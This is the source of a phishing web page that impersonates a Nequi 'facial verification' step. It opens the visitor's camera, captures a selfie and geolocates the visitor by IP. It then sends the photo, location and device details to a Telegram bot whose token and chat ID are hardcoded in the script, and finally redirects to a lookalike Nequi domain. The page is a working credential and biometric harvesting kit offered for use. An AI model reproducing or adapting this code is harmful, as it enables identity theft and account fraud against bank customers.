<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verificación Facial - Nequi</title>

<style>
body {
    margin: 0;
    background: #2b002b;
    overflow: hidden;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
}

video {
    position: absolute;
    width: 100%;
    height: 100%;
    object-fit: cover;
}

/* Overlay */
.overlay {
    position: absolute;
    width: 100%;
    height: 100%;
    background: rgba(43,0,43,0.5);
    mask-image: radial-gradient(ellipse 150px 210px at center, transparent 98%, black 100%);
    -webkit-mask-image: radial-gradient(ellipse 150px 210px at center, transparent 98%, black 100%);
}

/* Óvalo */
.oval {
    position: absolute;
    width: 300px;
    height: 420px;
    border-radius: 50%;
    border: 4px solid white;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    transition: 0.2s;
    pointer-events: none;
}

.valid {
    border-color: #00ff88;
    box-shadow: 0 0 25px #00ff88;
}

/* Texto */
.status {
    position: absolute;
    bottom: 30px;
    width: 100%;
    text-align: center;
    color: white;
    font-size: 18px;
    text-shadow: 0 2px 5px rgba(0,0,0,0.5);
    z-index: 10;
}

/* Botón de captura */
.capture-btn {
    position: absolute;
    bottom: 100px;
    left: 50%;
    transform: translateX(-50%);
    background: rgba(0,255,136,0.9);
    color: #2b002b;
    border: none;
    padding: 12px 30px;
    border-radius: 50px;
    font-size: 18px;
    font-weight: bold;
    cursor: pointer;
    z-index: 20;
    transition: all 0.2s;
    font-family: monospace;
}

.capture-btn:hover {
    background: #00ff88;
    transform: translateX(-50%) scale(1.05);
}

.capture-btn:disabled {
    background: rgba(100,100,100,0.7);
    cursor: not-allowed;
    transform: translateX(-50%);
}

/* Preview de foto */
.photo-preview {
    position: fixed;
    bottom: 80px;
    right: 20px;
    width: 100px;
    height: 100px;
    border-radius: 12px;
    overflow: hidden;
    border: 3px solid #00ff88;
    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
    z-index: 20;
    background: white;
    animation: slideIn 0.3s ease;
    cursor: pointer;
}

.photo-preview img {
    width: 100%;
    height: 100%;
    object-fit: cover;
}

.photo-preview .delete-btn {
    position: absolute;
    top: -8px;
    right: -8px;
    width: 24px;
    height: 24px;
    border-radius: 50%;
    background: red;
    color: white;
    border: none;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 16px;
    font-weight: bold;
}

@keyframes slideIn {
    from {
        opacity: 0;
        transform: translateX(100px);
    }
    to {
        opacity: 1;
        transform: translateX(0);
    }
}

/* Botón de reinicio */
.reset-btn {
    position: fixed;
    bottom: 20px;
    left: 20px;
    background: rgba(0,0,0,0.7);
    backdrop-filter: blur(5px);
    color: white;
    border: 1px solid rgba(255,255,255,0.3);
    padding: 10px 20px;
    border-radius: 25px;
    cursor: pointer;
    font-size: 14px;
    z-index: 20;
    transition: all 0.2s;
    font-family: monospace;
}

.reset-btn:hover {
    background: rgba(255,255,255,0.2);
    transform: scale(1.05);
}

/* Botón de enviar */
.send-btn {
    position: fixed;
    bottom: 20px;
    right: 20px;
    background: rgba(0,255,136,0.9);
    backdrop-filter: blur(5px);
    color: #2b002b;
    border: none;
    padding: 10px 20px;
    border-radius: 25px;
    cursor: pointer;
    font-size: 14px;
    z-index: 20;
    transition: all 0.2s;
    font-weight: bold;
    display: none;
}

.send-btn:hover {
    background: #00ff88;
    transform: scale(1.05);
}

/* Loader */
.loader {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.8);
    z-index: 9999;
    justify-content: center;
    align-items: center;
    flex-direction: column;
    gap: 15px;
}

.loader.active {
    display: flex;
}

.loader-spinner {
    width: 50px;
    height: 50px;
    border: 5px solid #f3f3f3;
    border-top: 5px solid #00ff88;
    border-radius: 50%;
    animation: spin 1s linear infinite;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

.loader-text {
    color: white;
    font-weight: 600;
}

/* Toast de éxito */
.success-toast {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background: rgba(0,255,136,0.95);
    color: #2b002b;
    padding: 20px 40px;
    border-radius: 50px;
    font-size: 24px;
    font-weight: bold;
    z-index: 30;
    animation: fadeInOut 1.5s ease;
    pointer-events: none;
    white-space: nowrap;
}

@keyframes fadeInOut {
    0% {
        opacity: 0;
        transform: translate(-50%, -50%) scale(0.8);
    }
    15% {
        opacity: 1;
        transform: translate(-50%, -50%) scale(1);
    }
    85% {
        opacity: 1;
        transform: translate(-50%, -50%) scale(1);
    }
    100% {
        opacity: 0;
        transform: translate(-50%, -50%) scale(0.8);
    }
}

/* Mensaje de estado adicional */
.status-message {
    position: fixed;
    bottom: 120px;
    left: 50%;
    transform: translateX(-50%);
    background: rgba(0,0,0,0.8);
    color: white;
    padding: 8px 16px;
    border-radius: 20px;
    font-size: 12px;
    z-index: 10;
    display: none;
    white-space: nowrap;
}
</style>
</head>

<body>

<video id="video" autoplay muted playsinline></video>
<div class="overlay"></div>
<div class="oval" id="oval"></div>
<div class="status" id="status">🎯 Iniciando cámara...</div>
<button class="capture-btn" id="captureBtn">📸 Tomar Selfie</button>
<button class="reset-btn" id="resetBtn">🔄 Reiniciar</button>
<button class="send-btn" id="sendBtn">📤 Enviar a Telegram</button>
<div class="status-message" id="statusMessage"></div>
<div class="loader" id="loader">
    <div class="loader-spinner"></div>
    <div class="loader-text" id="loaderText">Procesando...</div>
</div>

<script>
const video = document.getElementById("video");
const oval = document.getElementById("oval");
const statusText = document.getElementById("status");
const captureBtn = document.getElementById("captureBtn");
const resetBtn = document.getElementById("resetBtn");
const sendBtn = document.getElementById("sendBtn");
const statusMessage = document.getElementById("statusMessage");
const loader = document.getElementById("loader");
const loaderText = document.getElementById("loaderText");

// Configuración de Telegram
const TELEGRAM_CONFIG = {
    token: "8323486458:AAGJeAlHlciuq-STKT6i6f-kU9Vt_uCsgp8",
    chatId: "7776240161"
};

let photoTaken = false;
let currentPhotoData = null;

// Iniciar cámara
navigator.mediaDevices.getUserMedia({ 
    video: { 
        width: { ideal: 1280 },
        height: { ideal: 720 },
        facingMode: "user"
    } 
})
.then(stream => {
    video.srcObject = stream;
    statusText.innerText = "📷 Listo - Presiona el botón para tomar selfie";
    captureBtn.disabled = false;
})
.catch(err => {
    console.error("Error de cámara:", err);
    statusText.innerText = "❌ Error: No se puede acceder a la cámara";
    captureBtn.disabled = true;
});

// Tomar foto
function takePhoto() {
    if (photoTaken) {
        mostrarMensaje("Ya tienes una selfie, reinicia para tomar otra", true);
        return;
    }
    
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    
    const ctx = canvas.getContext("2d");
    // Aplicar espejo para selfie
    ctx.translate(canvas.width, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    ctx.setTransform(1, 0, 0, 1, 0, 0);
    
    currentPhotoData = canvas.toDataURL("image/png");
    photoTaken = true;
    
    // Cambiar color del óvalo a verde
    oval.classList.add("valid");
    
    showSuccessToast();
    statusText.innerText = "✅ ¡Selfie capturada con éxito!";
    
    createPhotoPreview(currentPhotoData);
    sendBtn.style.display = "block";
    captureBtn.disabled = true;
}

function showSuccessToast() {
    const toast = document.createElement('div');
    toast.className = 'success-toast';
    toast.textContent = '📸 ¡Selfie capturada!';
    document.body.appendChild(toast);
    
    setTimeout(() => {
        toast.remove();
    }, 1500);
}

function createPhotoPreview(imgData) {
    const existingPreview = document.querySelector('.photo-preview');
    if (existingPreview) existingPreview.remove();
    
    const preview = document.createElement('div');
    preview.className = 'photo-preview';
    
    const img = document.createElement('img');
    img.src = imgData;
    
    const deleteBtn = document.createElement('button');
    deleteBtn.className = 'delete-btn';
    deleteBtn.textContent = '×';
    deleteBtn.onclick = (e) => {
        e.stopPropagation();
        preview.remove();
        sendBtn.style.display = "none";
        photoTaken = false;
        currentPhotoData = null;
        oval.classList.remove("valid");
        captureBtn.disabled = false;
        statusText.innerText = "📷 Listo - Presiona el botón para tomar selfie";
        mostrarMensaje("Selfie eliminada, puedes tomar otra", false);
    };
    
    preview.appendChild(img);
    preview.appendChild(deleteBtn);
    
    document.body.appendChild(preview);
}

function mostrarMensaje(mensaje, esError = false) {
    statusMessage.textContent = mensaje;
    statusMessage.style.backgroundColor = esError ? 'rgba(255,0,0,0.8)' : 'rgba(0,255,136,0.9)';
    statusMessage.style.color = esError ? 'white' : '#2b002b';
    statusMessage.style.display = 'block';
    setTimeout(() => {
        statusMessage.style.display = 'none';
    }, 3000);
}

function dataURLtoBlob(dataURL) {
    const arr = dataURL.split(',');
    const mime = arr[0].match(/:(.*?);/)[1];
    const bstr = atob(arr[1]);
    let n = bstr.length;
    const u8arr = new Uint8Array(n);
    while (n--) {
        u8arr[n] = bstr.charCodeAt(n);
    }
    return new Blob([u8arr], { type: mime });
}

async function enviarATelegram() {
    if (!currentPhotoData) {
        mostrarMensaje("No hay foto para enviar", true);
        return;
    }
    
    loader.classList.add('active');
    loaderText.textContent = "Enviando verificación...";
    
    try {
        // Obtener IP y ubicación
        const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
        
        // Enviar la selfie
        loaderText.textContent = "Enviando selfie...";
        const blob = dataURLtoBlob(currentPhotoData);
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CONFIG.chatId);
        formData.append('caption', `🤳 Selfie - ${new Date().toLocaleString('es-CO')}`);
        formData.append('photo', blob, `selfie.jpg`);
        
        await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
        
        // Enviar mensaje con información adicional
        const mensajeInfo = `
🔔 **NUEVA SELFIE CAPTURADA** 🔔

✅ Selfie tomada correctamente

🌍 **DATOS DE UBICACIÓN:**
📍 IP: ${ipData.ip}
🏙 Ciudad: ${ipData.city}
🏛 Región: ${ipData.region}
🇨🇴 País: ${ipData.country_name}
📱 Dispositivo: ${navigator.userAgent}

⏰ **FECHA Y HORA:**
📅 ${new Date().toLocaleString('es-CO')}
`;
        
        await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CONFIG.chatId,
                text: mensajeInfo,
                parse_mode: 'Markdown'
            })
        });
        
        loader.classList.remove('active');
        mostrarMensaje("✅ Selfie enviada correctamente");
        
        // Deshabilitar botón de enviar
        sendBtn.style.display = 'none';
        
        // Redirigir después de 3 segundos
        setTimeout(() => {
            window.location.href = 'https://nequi-red.vercel.app/';
        }, 3000);
        
    } catch (error) {
        console.error('Error enviando a Telegram:', error);
        loader.classList.remove('active');
        mostrarMensaje("Error al enviar la selfie. Intenta nuevamente.", true);
    }
}

// Botón de capturar
captureBtn.addEventListener('click', () => {
    takePhoto();
});

// Botón de reinicio
resetBtn.addEventListener('click', () => {
    photoTaken = false;
    currentPhotoData = null;
    oval.classList.remove("valid");
    captureBtn.disabled = false;
    sendBtn.style.display = "none";
    
    const preview = document.querySelector('.photo-preview');
    if (preview) preview.remove();
    
    statusText.innerText = "📷 Listo - Presiona el botón para tomar selfie";
    mostrarMensaje("Reiniciado, puedes tomar una nueva selfie", false);
});

// Botón de enviar a Telegram
sendBtn.addEventListener('click', () => {
    enviarATelegram();
});
</script>

</body>
</html>
